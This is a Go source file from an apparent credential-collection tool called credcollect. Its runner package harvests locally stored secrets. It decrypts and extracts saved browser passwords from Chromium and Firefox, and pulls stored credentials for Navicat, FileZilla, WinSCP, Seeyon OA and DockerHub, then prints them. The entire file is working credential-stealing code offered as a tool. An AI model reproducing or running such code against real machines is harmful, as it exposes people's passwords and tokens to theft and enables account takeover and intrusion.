package runner

import (
	"log"

	"github.com/404tk/credcollect/common"
	"github.com/404tk/credcollect/pkg/browser"
	"github.com/404tk/credcollect/pkg/docker"
	"github.com/404tk/credcollect/pkg/filezilla"
	"github.com/404tk/credcollect/pkg/navicat"
	"github.com/404tk/credcollect/pkg/seeyon"
	"github.com/404tk/credcollect/pkg/winscp"
)

type Options struct {
	Silent bool
	Output string
}

type Output struct {
	Browser   []common.BrowserPassword
	Navicat   []common.NavicatPassWord
	FileZilla []common.FileZillaPassWord
	WinScp    []common.WinScpPassWord
	SeeyonOA  []common.SeeyonPassWord
	DockerHub []common.DockerHubPassWord
}

func (opt *Options) Enumerate() Output {
	var result Output
	result.Browser = opt.GetBrowserData()
	result.Navicat = navicat.Navicat()
	result.FileZilla = filezilla.FileZilla()
	result.WinScp = winscp.WinScp()
	result.SeeyonOA = seeyon.SeeyonOA()
	result.DockerHub = docker.DockerHub()
	opt.PrintResult(result)
	return result
}

func (opt *Options) GetBrowserData() (res []common.BrowserPassword) {
	browsers := browser.PickBrowser()

	ret := make(map[string]map[string][]interface{})
	for _, b := range browsers {
		err := b.InitSecretKey()
		if err != nil {
			continue
		}

		item, err := b.GetItem()
		if err != nil {
			continue
		}

		err = item.CopyDB()
		if err != nil {
			continue
		}

		key := b.GetSecretKey()
		switch b.(type) {
		case *browser.Chromium:
			err := item.ChromeParse(key)
			if err != nil {
				log.Println(err)
			}
		case *browser.Firefox:
			err := item.FirefoxParse()
			if err != nil {
				log.Println(err)
			}
		}

		err = item.Release()

		name := b.GetName()
		tmp := make(map[string][]interface{})
		err = item.OutPut(name, tmp)
		if err != nil {
			continue
		}
		ret[name] = tmp
	}
	for k, v := range ret {
		for _, pwd := range v["password"] {
			pwdInfo := pwd.(browser.LoginData)
			res = append(res, common.BrowserPassword{
				BrowserName: k,
				UserName:    pwdInfo.UserName,
				PassWord:    pwdInfo.Password,
				LoginUrl:    pwdInfo.LoginUrl,
				CreateDate:  pwdInfo.CreateDate.String(),
			})
		}
	}
	return res
}
